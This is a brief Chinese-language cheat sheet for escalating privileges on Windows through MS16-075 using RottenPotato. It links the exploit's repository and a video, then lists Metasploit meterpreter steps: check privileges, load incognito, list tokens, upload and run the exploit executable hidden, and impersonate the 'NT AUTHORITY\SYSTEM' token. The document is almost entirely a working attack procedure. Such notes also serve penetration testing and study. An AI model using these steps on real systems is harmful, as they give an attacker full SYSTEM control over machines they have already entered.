MS16-075

https://github.com/foxglovesec/RottenPotato
youtube视频

获取meterpreter之后:
getprivs

使用这个模块:
use incognito 

查看已有的token:
list_tokens -u 

上传到目标主机之后执行:
execute -Hc -f [exe]

再查看已有token
list_tokens -u 

如果有system:
impersonate_token "NT AUTHORITY\\SYSTEM"
